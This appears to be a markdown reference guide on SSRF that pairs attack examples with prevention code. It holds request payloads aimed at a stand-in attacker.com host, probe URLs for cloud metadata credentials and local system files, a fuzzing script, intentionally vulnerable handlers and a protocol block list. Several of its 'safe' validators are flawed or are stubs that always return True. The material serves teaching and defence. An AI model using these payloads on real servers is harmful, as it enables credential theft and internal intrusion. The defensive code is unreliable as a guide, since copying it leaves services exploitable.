# Server-Side Request Forgery (SSRF)

> Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. SSRF attacks can lead to unauthorized actions, data exfiltration, and even remote code execution in some cases.

## Summary

* [Types of SSRF](#types-of-ssrf)
* [SSRF Attack Scenarios](#ssrf-attack-scenarios)
* [Common SSRF Vulnerabilities](#common-ssrf-vulnerabilities)
* [SSRF Prevention](#ssrf-prevention)
* [URL Parsing Issues](#url-parsing-issues)
* [Bypass Techniques](#bypass-techniques)
* [SSRF in Cloud Environments](#ssrf-in-cloud-environments)
* [SSRF Testing Tools](#ssrf-testing-tools)
* [SSRF in Modern Applications](#ssrf-in-modern-applications)
* [References](#references)

## Types of SSRF

### 1. Basic SSRF
The server makes HTTP requests to URLs controlled by the attacker.

**Example:**
```http
POST /fetch-image HTTP/1.1
Host: example.com
Content-Type: application/json

{"url": "http://attacker.com/malicious"}
```

### 2. Blind SSRF
The server makes requests to attacker-controlled URLs but doesn't return the response to the attacker.

**Example:**
```http
POST /webhook HTTP/1.1
Host: api.example.com
Content-Type: application/json

{"callback_url": "http://attacker.com/callback"}
```

### 3. Semi-Blind SSRF
The server returns partial information about the request (status codes, response times).

## SSRF Attack Scenarios

### 1. Internal Network Scanning
```python
# Vulnerable code
import requests

def fetch_image(url):
    # No validation of target URL
    response = requests.get(url)
    return response.content

# Attack payload
# url = "http://192.168.1.1:22"  # Internal SSH service
# url = "http://10.0.0.1:3306"   # Internal MySQL service
```

### 2. Metadata Service Access
```bash
# AWS EC2 Metadata Service
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud Metadata
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Azure Metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 3. File Protocol Abuse
```python
# File protocol access
file:///etc/passwd
file:///proc/self/environ
file:///proc/net/tcp
file:///windows/system32/drivers/etc/hosts
```

### 4. Internal API Access
```http
# Accessing internal APIs
POST /api/proxy HTTP/1.1
Host: example.com

{"url": "http://internal-api.local/admin/users"}
```

## Common SSRF Vulnerabilities

### 1. URL Parameters
```python
# Vulnerable Python code
import requests
from urllib.parse import urlparse

def get_webhook_data(url):
    # Basic validation only
    parsed = urlparse(url)
    if parsed.scheme not in ['http', 'https']:
        return None
    
    # Vulnerable - no IP validation
    response = requests.get(url)
    return response.text
```

### 2. Image Processing
```python
# Image upload with URL fetching
@app.route('/upload', methods=['POST'])
def upload_image():
    image_url = request.form.get('image_url')
    
    # Vulnerable - no validation
    response = requests.get(image_url)
    
    # Process image...
    return "Image uploaded successfully"
```

### 3. PDF Generation
```python
# PDF generation with external resources
def generate_pdf(url):
    # Vulnerable - fetches external resources
    pdfkit.from_url(url, 'output.pdf')
    
    # Could be exploited to fetch internal resources
    return send_file('output.pdf')
```

### 4. Webhook Systems
```python
# Webhook notification system
def send_webhook(url, payload):
    # Vulnerable - no URL validation
    requests.post(url, json=payload)
    
    # Could be used to target internal services
    return "Webhook sent"
```

## SSRF Prevention

### 1. URL Whitelisting
```python
import ipaddress
import re
from urllib.parse import urlparse

def is_safe_url(url, allowed_domains=None):
    """Validate URL against whitelist"""
    if allowed_domains is None:
        allowed_domains = ['example.com', 'api.example.com']
    
    try:
        parsed = urlparse(url)
        
        # Check scheme
        if parsed.scheme not in ['http', 'https']:
            return False
        
        # Check domain
        hostname = parsed.hostname
        if not hostname:
            return False
        
        # Check against whitelist
        if hostname not in allowed_domains:
            return False
        
        # Check for IP addresses
        try:
            ip = ipaddress.ip_address(hostname)
            # Block private/internal IPs
            if ip.is_private or ip.is_loopback or ip.is_link_local:
                return False
        except ValueError:
            # Not an IP address, continue with domain check
            pass
        
        return True
    except Exception:
        return False

# Usage
safe_urls = ['https://api.example.com', 'https://cdn.example.com']
if is_safe_url(user_url, safe_urls):
    # Safe to proceed
    pass
```

### 2. DNS Resolution with Validation
```python
import socket
import ipaddress

def resolve_and_validate_hostname(hostname):
    """Resolve hostname and validate IP"""
    try:
        # Resolve hostname to IP
        ip = socket.gethostbyname(hostname)
        ip_obj = ipaddress.ip_address(ip)
        
        # Block private/internal networks
        if (ip_obj.is_private or 
            ip_obj.is_loopback or 
            ip_obj.is_link_local or
            ip_obj.is_multicast):
            return None
        
        return ip
    except Exception:
        return None

def safe_http_request(url):
    """Make HTTP request with SSRF protection"""
    parsed = urlparse(url)
    hostname = parsed.hostname
    
    # Validate hostname resolution
    resolved_ip = resolve_and_validate_hostname(hostname)
    if not resolved_ip:
        raise ValueError("Invalid or unsafe hostname")
    
    # Proceed with request
    response = requests.get(url)
    return response
```

### 3. Network Segmentation
```python
# Network isolation configuration
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class SSRFSafeAdapter(HTTPAdapter):
    def __init__(self, allowed_networks=None, **kwargs):
        self.allowed_networks = allowed_networks or []
        super().__init__(**kwargs)
    
    def send(self, request, **kwargs):
        # Validate target IP
        hostname = urlparse(request.url).hostname
        ip = socket.gethostbyname(hostname)
        
        if not self.is_ip_allowed(ip):
            raise ValueError(f"IP {ip} not allowed")
        
        return super().send(request, **kwargs)
    
    def is_ip_allowed(self, ip):
        """Check if IP is in allowed networks"""
        ip_obj = ipaddress.ip_address(ip)
        for network in self.allowed_networks:
            if ip_obj in ipaddress.ip_network(network):
                return True
        return False

# Usage
session = requests.Session()
adapter = SSRFSafeAdapter(allowed_networks=['8.8.8.0/24'])
session.mount('http://', adapter)
session.mount('https://', adapter)
```

### 4. Metadata Service Protection
```python
# Block cloud metadata services
METADATA_IPS = [
    '169.254.169.254',  # AWS, Azure, GCP
    'fd00:ec2::254',    # AWS IPv6
]

def block_metadata_services(url):
    """Block access to cloud metadata services"""
    parsed = urlparse(url)
    hostname = parsed.hostname
    
    try:
        ip = socket.gethostbyname(hostname)
        if ip in METADATA_IPS:
            raise ValueError("Metadata service access blocked")
    except socket.gaierror:
        # Handle DNS resolution errors
        pass
    
    return True
```

## URL Parsing Issues

### 1. URL Parsing Ambiguities
```python
# URL parsing vulnerabilities
from urllib.parse import urlparse

# Example: http://google.com@evil.com/
# This might be parsed as google.com but actually connects to evil.com

def validate_url_structure(url):
    """Validate URL structure to prevent parsing issues"""
    parsed = urlparse(url)
    
    # Check for @ in hostname
    if '@' in parsed.netloc:
        return False
    
    # Check for unusual schemes
    if parsed.scheme not in ['http', 'https']:
        return False
    
    # Check for port manipulation
    if parsed.port and parsed.port not in [80, 443]:
        # Additional validation for non-standard ports
        pass
    
    return True
```

### 2. IPv6 and IPv4-mapped IPv6
```python
import ipaddress

def validate_ip_format(ip_str):
    """Validate IP address format"""
    try:
        ip = ipaddress.ip_address(ip_str)
        
        # Check for IPv4-mapped IPv6
        if ip.version == 6:
            # Check if it's IPv4-mapped
            if ip.ipv4_mapped:
                ip = ip.ipv4_mapped
        
        return ip
    except ValueError:
        return None
```

## Bypass Techniques

### 1. DNS Rebinding
```python
# DNS rebinding attack
# Attacker controls DNS and makes it resolve to internal IP after initial check

def prevent_dns_rebinding(url, max_age=1):
    """Prevent DNS rebinding attacks"""
    import time
    
    # Resolve hostname multiple times
    hostname = urlparse(url).hostname
    
    # First resolution
    initial_ip = socket.gethostbyname(hostname)
    
    # Wait and resolve again
    time.sleep(max_age)
    final_ip = socket.gethostbyname(hostname)
    
    # Check if IP changed
    if initial_ip != final_ip:
        raise ValueError("DNS rebinding detected")
    
    return final_ip
```

### 2. Redirect Chains
```python
# Handle redirect chains safely
import requests

def safe_request_with_redirects(url, max_redirects=2):
    """Make request with redirect validation"""
    session = requests.Session()
    session.max_redirects = max_redirects
    
    response = session.get(url, allow_redirects=False)
    
    # Validate each redirect
    for redirect in response.history:
        if not is_safe_url(redirect.url):
            raise ValueError("Unsafe redirect detected")
    
    return response
```

### 3. Protocol Handlers
```python
# Block dangerous protocols
DANGEROUS_PROTOCOLS = [
    'file', 'ftp', 'gopher', 'dict', 'ldap', 'tftp', 'sftp'
]

def validate_protocol(url):
    """Block dangerous protocols"""
    parsed = urlparse(url)
    if parsed.scheme in DANGEROUS_PROTOCOLS:
        return False
    return True
```

## SSRF in Cloud Environments

### 1. AWS Metadata Service
```python
# AWS specific SSRF protection
AWS_METADATA_IP = '169.254.169.254'

def block_aws_metadata(url):
    """Block AWS metadata service"""
    parsed = urlparse(url)
    hostname = parsed.hostname
    
    # Check for AWS metadata IP
    if hostname == AWS_METADATA_IP:
        return False
    
    # Check for metadata hostname
    if 'metadata' in hostname.lower():
        return False
    
    return True
```

### 2. GCP Metadata Service
```python
# GCP specific protection
GCP_METADATA_HOSTS = [
    'metadata.google.internal',
    'metadata.google.com',
    'metadata'
]

def block_gcp_metadata(url):
    """Block GCP metadata service"""
    parsed = urlparse(url)
    hostname = parsed.hostname
    
    if hostname in GCP_METADATA_HOSTS:
        return False
    
    return True
```

### 3. Azure Metadata Service
```python
# Azure specific protection
AZURE_METADATA_IP = '169.254.169.254'

def block_azure_metadata(url):
    """Block Azure metadata service"""
    parsed = urlparse(url)
    hostname = parsed.hostname
    
    if hostname == AZURE_METADATA_IP:
        return False
    
    return True
```

## SSRF Testing Tools

### 1. Manual Testing
```bash
# Basic SSRF tests
http://localhost:22
http://127.0.0.1:3306
http://169.254.169.254/latest/meta-data/
http://10.0.0.1:5432
file:///etc/passwd
```

### 2. Automated Tools
```python
# Python SSRF testing script
import requests
import socket

def test_ssrf(url, payloads):
    """Test SSRF vulnerabilities"""
    results = []
    
    for payload in payloads:
        test_url = url.replace('FUZZ', payload)
        try:
            response = requests.get(test_url, timeout=5)
            results.append({
                'payload': payload,
                'status': response.status_code,
                'response_time': response.elapsed.total_seconds()
            })
        except Exception as e:
            results.append({
                'payload': payload,
                'error': str(e)
            })
    
    return results

# Common SSRF payloads
ssrf_payloads = [
    'http://localhost:22',
    'http://127.0.0.1:3306',
    'http://169.254.169.254/latest/meta-data/',
    'http://10.0.0.1:5432',
    'file:///etc/passwd',
    'http://0.0.0.0:22',
    'http://0000----0..1:22'
]
```

### 3. Burp Suite Extensions
```python
# Burp Suite SSRF testing
# Use SSRF Scanner extension
# Test with Collaborator client
```

## SSRF in Modern Applications

### 1. GraphQL SSRF
```graphql
# Vulnerable GraphQL query
query {
    fetchUrl(url: "http://internal-api.local/users") {
        content
        statusCode
    }
}

# Safe implementation with validation
```

### 2. Webhook Systems
```python
# Safe webhook implementation
class WebhookService:
    def __init__(self):
        self.allowed_domains = ['trusted-partner.com']
        self.blocked_ips = ['169.254.169.254', '127.0.0.1']
    
    def send_webhook(self, url, payload):
        if not self.is_url_allowed(url):
            raise ValueError("URL not allowed")
        
        # Additional validation
        self.validate_target(url)
        
        # Send webhook
        response = requests.post(url, json=payload)
        return response
    
    def is_url_allowed(self, url):
        """Comprehensive URL validation"""
        # Implement all validation checks
        return True
```

### 3. Image Processing Services
```python
# Safe image processing
class ImageProcessor:
    def __init__(self):
        self.allowed_schemes = ['http', 'https']
        self.max_file_size = 10 * 1024 * 1024  # 10MB
    
    def process_image_url(self, image_url):
        """Process image from URL with SSRF protection"""
        # Validate URL
        if not self.validate_image_url(image_url):
            raise ValueError("Invalid image URL")
        
        # Download with restrictions
        response = self.safe_download(image_url)
        
        # Process image
        return self.process_image(response.content)
    
    def validate_image_url(self, url):
        """Validate image URL"""
        # Implement URL validation
        return True
    
    def safe_download(self, url):
        """Download with restrictions"""
        # Implement safe download
        pass
```

## References

* [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
* [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
* [SSRF Bible](https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf)
* [Cloud Metadata SSRF](https://hackerone.com/reports/341876)
* [SSRF Testing Guide](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server_Side_Request_Forgery)
